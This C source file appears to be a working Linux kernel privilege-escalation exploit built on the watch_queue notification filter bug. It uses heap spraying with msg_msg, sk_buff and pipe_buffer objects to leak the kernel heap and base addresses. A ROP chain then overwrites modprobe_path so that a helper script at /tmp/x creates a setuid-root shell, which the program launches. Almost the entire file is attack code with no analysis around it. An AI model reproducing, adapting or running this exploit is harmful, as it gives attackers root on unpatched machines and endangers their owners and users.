#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <sched.h>
#include <linux/watch_queue.h>
#include <sys/socket.h>
#include <signal.h>

#define MSG_MSG_SPRAY_COUNT 1000
#define HOLE_MSG_INDEX 995

#define MSG_TYPE_96  0xaa
#define MSG_TYPE_1024 0xbb
#define MSG_TYPE_FAKE 0xcc

#define SPRAY_SIZE_KMALLOC_96 96 - 0x30
#define SPRAY_SIZE_KMALLOC_1024 1024 - 0x30

#define SPRAY_SOCKET_FDCNT 4
#define SPRAY_COUNT_PER_SOCKET_FD 128
#define SK_BUFF_SPRAY_SIZE 1024 - 0x140

#define SPRAY_PIPE_FDCNT 1024

/* kernel base: ffffffff81000000 */
#define ANON_PIPE_BUF_OPS_ADDR 0x123eac0

int spray_queue[MSG_MSG_SPRAY_COUNT];
int corrupted_queue_index;
int dangling_queue_index;

int socket_fd[SPRAY_SOCKET_FDCNT][2];
int pipe_fds[SPRAY_PIPE_FDCNT][2];

uint64_t user_cs;
uint64_t user_ss;
uint64_t user_sp;
uint64_t user_rflags;

struct msg_buf {
    uint64_t mtype;
    char mtext[1];
};

struct list_head {
	struct list_head *next, *prev;
};

struct msg_msg {
	struct list_head m_list;
	long m_type;
	size_t m_ts;
	struct msg_msgseg *next;
	void *security;
};

struct pipe_buf_operations {
    uint64_t confirm;
    uint64_t release;
    uint64_t try_steal;
    uint64_t get;
};

struct pipe_buffer {
	uint64_t page;
	unsigned int offset, len;
	uint64_t ops;
	unsigned int flags;
	unsigned long private;
};

void save_state()
{
    __asm__ __volatile__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void get_shell()
{
    signal(SIGSEGV, SIG_DFL);
    system("echo "\"#!/bin/sh\\nsetuidgid 0 /bin/sh\" > /tmp/shell");
    system("chmod 777 /tmp/shell");
    system("chmod 777 /tmp/x");
    system("echo \"#!/bin/sh\\nchown root:root /tmp/shell\nchmod 4777 /tmp/shell\" > /tmp/x");
    system("echo -e \"\\xff\\xff\\xff\\xff\" > /tmp/trigger");
    system("chmod 777 /tmp/trigger");
    system("/tmp/trigger");
    system("echo \"get shell\"");
    sleep(1);
    system("/tmp/shell");
}

int cpu_init()
{
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(0, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set) == -1) {
        perror("sched_setaffinity()");
        return 0;
  }
  return 1;
}

int msg_msg_spray(int spray_count)
{
    int i;
    struct msg_buf* message = (struct msg_buf*)malloc(2048);

    memset(message, 0, 2048);

    for (i = 0; i < spray_count; i++)
    {
        /* create queue */
        if ((spray_queue[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1)
        {
            perror("msg_msg_spray: create queue failed\n");
            exit(0);           
        }
        /* send message - alloc kmalloc-96*/
        message->mtype = MSG_TYPE_96;
        ((uint64_t*)message->mtext)[0] = i;
        ((uint64_t*)message->mtext)[5] = 0;
        if (msgsnd(spray_queue[i], message, SPRAY_SIZE_KMALLOC_96, 0) < 0)
        {
            perror("msg_msg_spray: msgsnd 96 failed\n");
            exit(0);
        }

        if (i == HOLE_MSG_INDEX)
        {
            /* if HOLE allocation, do not allocate 1024 message */
            continue;
        }

        /* send message - alloc kmalloc-1024 : kmalloc-96 -> mlist.next -> kmalloc-1024*/
        message->mtype = MSG_TYPE_1024;
        ((uint64_t*)message->mtext)[0] = i;
        ((uint64_t*)message->mtext)[5] = 0;
        if (msgsnd(spray_queue[i], message, SPRAY_SIZE_KMALLOC_1024, 0) < 0)
        {
            perror("msg_msg_spray: msgsnd 1024 failed\n");
            exit(0);
        }
    }
    free(message);
}

int msg_msg_make_hole()
{
    int hole_target_queue = spray_queue[HOLE_MSG_INDEX];
    struct msg_buf* message = malloc(0x1000);

    if (msgrcv(hole_target_queue, message, SPRAY_SIZE_KMALLOC_96, MSG_TYPE_96, IPC_NOWAIT) < 0)
    {
        perror("msg_msg_make_hole: msgrcv failed\n");
        exit(0);
    }
    free(message);
}

int trigger_vuln(void)
{
    int nfilters = 4;
    struct watch_notification_filter *filter = (struct watch_notification_filter*)malloc(sizeof(struct watch_notification_filter) + nfilters * sizeof(struct watch_notification_type_filter));
    int i;
    int fds[2];

    filter->nr_filters = nfilters;
    for (i = 0; i < (nfilters - 1); i++)
    {
        filter->filters[i].type = 1;
    }

    filter->filters[nfilters - 1].type = 0x30a;

    if (pipe2(fds, O_NOTIFICATION_PIPE) == -1)
    {
        perror("trigger_vuln: pipe2 failed\n");
        exit(0);
    }

    if(ioctl(fds[0], IOC_WATCH_QUEUE_SET_FILTER, filter) < 0)
    {
        perror("trigger_vuln: ioctl failed\n");
        exit(0);
    }
    free(filter);
}

int check_trigger(void)
{
    /* check corrupted msg_msg header */
    struct msg_buf *message = (struct msg_buf*)malloc(2048);
    memset(message, 0, 2048);
    int i;
    int recv_code = 0;

    for (i = 0; i < MSG_MSG_SPRAY_COUNT; i++)
    {
        if (i == HOLE_MSG_INDEX)
        {
            continue;
        }

        /* MSG_COPY because we should not free msg_msg header */
        if (msgrcv(spray_queue[i], message, SPRAY_SIZE_KMALLOC_1024, 1, MSG_COPY | IPC_NOWAIT) < 0)
        {
            perror("check_trigger: msgrcv failed\n");
            printf("check_trigger: %d msgrcv failed\n", i);
            exit(0);
        }
        if (((uint64_t*)message->mtext)[0] != i)
        {
            printf("triggered index: %d, %d\n", i, ((uint64_t*)message->mtext)[0]);
            corrupted_queue_index = i;
            dangling_queue_index = ((uint64_t*)message->mtext)[0];
            return i;
        }
    }
    free(message);
    return -1;
}

void msg_msg_clean()
{
    int i;
    for(i = 0; i < MSG_MSG_SPRAY_COUNT; i++)
    {
        if (i == HOLE_MSG_INDEX)
        {
            continue;
        }
        msgctl(spray_queue[i], IPC_RMID, NULL);
    }
}

int msg_msg_free(int queue_index, int size, int type)
{
    int target_queue = spray_queue[queue_index];
    struct msg_buf* message = malloc(2048);
    printf("msg_msg_free: free message\n");
    if (msgrcv(target_queue, message, size, type, IPC_NOWAIT) < 0)
    {
        perror("msg_msg_make_hole: msgrcv failed\n");
        exit(0);
    }
    free(message);
}

void sk_buff_create()
{
    int i;

    for(i = 0; i < SPRAY_SOCKET_FDCNT; i++)
    {
        if(socketpair(AF_UNIX, SOCK_STREAM, 0, socket_fd[i]) < 0)
        {
            perror("sk_buff_create: socketpair failed\n");
            exit(0);
        }
    }
}

void sk_buff_spray()
{
    int i, j;
    /* make msg_msg buff*/
    struct msg_msg* sk_buff = (struct msg_msg*)malloc(SK_BUFF_SPRAY_SIZE);
    sk_buff->m_list.next = 0x4141414141414141;
    sk_buff->m_list.prev = 0x4242424242424242;
    sk_buff->m_type = MSG_TYPE_FAKE;
    sk_buff->m_ts = 8192 - 0x30;
    sk_buff->next = 0;
    sk_buff->security = 0;
    
    for (i = 0; i < SPRAY_SOCKET_FDCNT; i++)
    {
        for(j = 0; j < SPRAY_COUNT_PER_SOCKET_FD; j++)
        {
            if (write(socket_fd[i][0], (void*)sk_buff, SK_BUFF_SPRAY_SIZE) < 0)
            {
                perror("sk_buff_spray: failed write buffer");
                exit(0);
            }
        }
    }
}

void sk_buff_spray2(uint64_t fake_kmalloc_96_addr)
{
    int i, j;
    /* make msg_msg buff*/
    struct msg_msg* sk_buff = (struct msg_msg*)malloc(SK_BUFF_SPRAY_SIZE);
    sk_buff->m_list.next = 0x4141414141414141;
    sk_buff->m_list.prev = 0x4242424242424242;
    sk_buff->m_type = MSG_TYPE_FAKE;
    sk_buff->m_ts = 8192 - 0x30;
    sk_buff->next = fake_kmalloc_96_addr - 8;
    sk_buff->security = 0;
    
    for (i = 0; i < SPRAY_SOCKET_FDCNT; i++)
    {
        for(j = 0; j < SPRAY_COUNT_PER_SOCKET_FD; j++)
        {
            if (write(socket_fd[i][0], (void*)sk_buff, SK_BUFF_SPRAY_SIZE) < 0)
            {
                perror("sk_buff_spray: failed write buffer");
                exit(0);
            }
        }
    }
}

uint64_t leak_heap_addr()
{
    struct msg_buf* message = malloc(8192);
    uint64_t leaked_heap_addr;
    if (msgrcv(spray_queue[corrupted_queue_index], message, 8192 - 0x30, 1, IPC_NOWAIT | MSG_COPY) < 0)
    {
        perror("leak_heap_addr: msgrcv failed\n");
        exit(0);
    }
    leaked_heap_addr = *(uint64_t*)(&message->mtext[1024 - 0x30 + 8]);
    printf("leaked heap addr: 0x%llx\n", leaked_heap_addr);
    return leaked_heap_addr;
}

uint64_t leak_heap_addr2()
{
    struct msg_buf* message = malloc(8192);
    uint64_t leaked_heap_addr;
    if (msgrcv(spray_queue[corrupted_queue_index], message, 8192 - 0x30, 1, IPC_NOWAIT | MSG_COPY) < 0)
    {
        perror("leak_heap_addr2: msgrcv failed\n");
        exit(0);
    }
    leaked_heap_addr = *(uint64_t*)(&message->mtext[4096 - 48]);
    printf("leaked heap addr (kmalloc-1024): 0x%llx\n", leaked_heap_addr);
    printf("%llx\n", *(uint64_t*)(&message->mtext[4096 - 48 + 8]));
    return leaked_heap_addr;
}

void sk_buff_clean()
{
    int i, j;
    char read_buffer[1024];
    for (i = 0; i < SPRAY_SOCKET_FDCNT; i++)
    {
        for(j = 0; j < SPRAY_COUNT_PER_SOCKET_FD; j++)
        {
            if (read(socket_fd[i][1], read_buffer, 1024 - 0x140) < 0)
            {
                perror("sk_buff_clean: sk_buff read failed\n");
                exit(0);
            }
        }
    }
}

uint64_t leak_base_addr(uint64_t leaked_heap_addr)
{
    uint8_t read_buffer[4096] = {0,};
    uint64_t kernel_base_addr = 0;
    uint64_t anon_pipe_buf_ops_addr = 0;
    struct msg_msg* sk_buff = (struct msg_msg*)malloc(SK_BUFF_SPRAY_SIZE);
    int i, j;

    printf("leak_base_addr: clean sk_buff\n");
    sk_buff_clean();
    printf("leak_base_addr: reallocate sk_buff which looks like real chunk\n");

    sk_buff->m_list.next = leaked_heap_addr;
    sk_buff->m_list.prev = leaked_heap_addr;
    sk_buff->m_type = MSG_TYPE_FAKE;
    sk_buff->m_ts = SPRAY_SIZE_KMALLOC_1024;
    sk_buff->next = 0;
    sk_buff->security = 0;
    
    for (i = 0; i < SPRAY_SOCKET_FDCNT; i++)
    {
        for(j = 0; j < SPRAY_COUNT_PER_SOCKET_FD; j++)
        {
            if (write(socket_fd[i][0], (void*)sk_buff, SK_BUFF_SPRAY_SIZE) < 0)
            {
                perror("sk_buff_spray: failed write buffer");
                exit(0);
            }
        }
    }

    printf("leak_base_addr: free dangling chunk with msg_msg\n");
    msgrcv(spray_queue[corrupted_queue_index], read_buffer,  SPRAY_SIZE_KMALLOC_1024, MSG_TYPE_FAKE, IPC_NOWAIT);

    printf("leak_base_addr: spray pipe_buffer\n");
    for (i = 0; i < SPRAY_PIPE_FDCNT; i++)
    {
        if(pipe(pipe_fds[i]) < 0)
        {
            perror("leak_base_addr: failed create pipe\n");
            exit(0);
        }

        if(write(pipe_fds[i][1], "A", 1) < 0)
        {
            perror("leak_base_addr: failed write pipe buffer\n");
            exit(0);
        }
    }

    printf("leak_base_addr: read sk_buff\n");
    for (i = 0; i < SPRAY_SOCKET_FDCNT; i++)
    {
        for(j = 0; j < SPRAY_COUNT_PER_SOCKET_FD; j++)
        {
            if (read(socket_fd[i][1], read_buffer, 1024 - 0x140) < 0)
            {
                perror("leak_base_addr: sk_buff read failed\n");
                exit(0);
            }
            if (((uint64_t*)read_buffer)[2] != MSG_TYPE_FAKE)
            {
                anon_pipe_buf_ops_addr = ((uint64_t*)read_buffer)[2];
                printf("leak_base_addr: anon_pipe_buf_ops_addr - 0x%llx\n", anon_pipe_buf_ops_addr);
            }
        }
    }
find: 
    if ((anon_pipe_buf_ops_addr & 0xffff000000000000) != 0xffff000000000000)
    {
        printf("leak_base_addr: leak kernel base failed\n");
        exit(0);
    }

    kernel_base_addr = anon_pipe_buf_ops_addr - ANON_PIPE_BUF_OPS_ADDR;
    printf("leak_base_addr: kernel base - 0x%llx\n", kernel_base_addr);
    return kernel_base_addr;
}

void rip_control(uint64_t kernel_base_addr, uint64_t fake_chunk_address)
{
    uint64_t sk_buff[1024] = {0,};
    struct pipe_buffer* fake_pipe_buffer = (struct pipe_buffer*)sk_buff;
    struct pipe_buf_operations* fake_pipe_ops = (struct pipe_buf_operations*)&sk_buff[20];
    int i, j;
    int index = 0;
    /* segfault handler for usermode change */
    signal(SIGSEGV, get_shell);
    /* make fake pipe buffer */
    memset(sk_buff, 0x43, sizeof(sk_buff));

    /* rop chain */
    /* 0xffffffff81c64f83: 0xffffffff81c64f83 : push rsi ; imul edi, edi, 0x41 ; pop rsp ; pop rbp ; ret */
    /* 0xffffffff8288bec0 <modprobe_path>:	"/sbin/modprobe" */
    /* 0xffffffff813fdde2 : mov qword ptr [rdx], rsi ; ret */
    /* 0xffffffff826c75a2 : pop rsi ; pop rdi ; pop rbp ; ret */
    /* 0xffffffff810007ff : pop rsi ; pop r15 ; pop rbp ; ret */
    /* 0xffffffff81ce5908 : swapgs ; ret */

    uint64_t modprobe_path = 0x188bec0 + kernel_base_addr;
    uint64_t kpti_trampoline = 0xe01026 + kernel_base_addr;
    uint64_t push_rsi_pop_rsp_pop_rbp_ret = 0xc64f83 + kernel_base_addr;
    uint64_t pop_rsi_pop_rdx_pop_rbp_ret = 0x123824 + kernel_base_addr;
    uint64_t mov_rdx_rsi_ret = 0x3fdde2 + kernel_base_addr;
    uint64_t pop_rsi_pop_r15_pop_rbp_ret = 0x7ff + kernel_base_addr;
    uint64_t swapgs_ret = 0xce5908 + kernel_base_addr;
    uint64_t iretq = 0xe010a7 + kernel_base_addr;

    sk_buff[index++] = 0;
    sk_buff[index++] = pop_rsi_pop_rdx_pop_rbp_ret;
    sk_buff[index++] = 0; //dummy
    sk_buff[index++] = modprobe_path;
    sk_buff[index++] = 0; //dummy
    sk_buff[index++] = pop_rsi_pop_r15_pop_rbp_ret;
    sk_buff[index++] = 0x782f706d742f; // /tmp/x
    sk_buff[index++] = 0; //dummy
    sk_buff[index++] = 0; //dummy
    sk_buff[index++] = mov_rdx_rsi_ret;
    sk_buff[index++] = swapgs_ret;
    sk_buff[index++] = iretq;
    //sk_buff[index++] = kpti_trampoline;
    //sk_buff[index++] = 0; //dummy
    //sk_buff[index++] = 0; //dummy
    sk_buff[index++] = (uint64_t)&get_shell;
    sk_buff[index++] = user_cs;
    sk_buff[index++] = user_rflags;
    sk_buff[index++] = user_sp;
    sk_buff[index++] = user_ss;
    
    fake_pipe_buffer->ops = fake_chunk_address + 160;
    fake_pipe_ops->release = push_rsi_pop_rsp_pop_rbp_ret;

    printf("rip_control: spray sk_buff\n");
    for (i = 0; i < SPRAY_SOCKET_FDCNT; i++)
    {
        for(j = 0; j < SPRAY_COUNT_PER_SOCKET_FD; j++)
        {
            if (write(socket_fd[i][0], (void*)sk_buff, SK_BUFF_SPRAY_SIZE) < 0)
            {
                perror("rip_control: failed write buffer");
                exit(0);
            }
        }
    }

    printf("rip_control: trigger pipe_ops->release\n");
    for ( i = 0; i < SPRAY_PIPE_FDCNT; i++)
    {
        if (close(pipe_fds[i][0]) < 0)
        {
            perror("rip_control: failed close pipe_fd\n");
            exit(0);
        }
        if (close(pipe_fds[i][1]) < 0)
        {
            perror("rip_control: failed close pipe_fd\n");
            exit(0);
        }
    }
}

int main(void)
{
    cpu_init();
    save_state();
    int i;
    for(i = 0; i < 10; i++)
    {
        printf("[STEP1-1] Spray msg_msg and make hole\n");
        msg_msg_spray(MSG_MSG_SPRAY_COUNT);
        msg_msg_make_hole();
        printf("[STEP1-2] Trigger vulnerability\n");
        trigger_vuln();
        printf("[STEP1-3] Check corrupted msg_msg\n");
        if (check_trigger() != -1)
        {
            break;
        }
        printf("failed corrupt msg_msg_pointer\n");
        msg_msg_clean();
    }
    printf("[STEP2-1] free dangling queue %d and spray sk_buff\n", dangling_queue_index);
    sleep(1);
    msg_msg_free(spray_queue[dangling_queue_index], SPRAY_SIZE_KMALLOC_1024 ,MSG_TYPE_1024);
    sk_buff_create();
    sk_buff_spray();

    printf("[STEP3] Leak kernel heap address\n");
    uint64_t leaked_heap_addr = leak_heap_addr();

    if ((leaked_heap_addr & 0xffff000000000000) != 0xffff000000000000)
    {
        printf("heap leak error\n");
        goto err;
    }

    sk_buff_clean();
    sk_buff_spray2(leaked_heap_addr);

    uint64_t leaked_heap_addr_kmalloc_1024 = leak_heap_addr2();

    if ((leaked_heap_addr_kmalloc_1024 & 0xffff000000000000) != 0xffff000000000000)
    {
        printf("heap leak error\n");
        goto err;
    }

    printf("[STEP4] Leak kernel base address\n");
    uint64_t kernel_base_addr = leak_base_addr(leaked_heap_addr);

    printf("[STEP5] RIP control\n");
    rip_control(kernel_base_addr, leaked_heap_addr_kmalloc_1024 - 1024);
    /*make fake pipe_op struct */
    err:
        msg_msg_clean();
        return -1;
}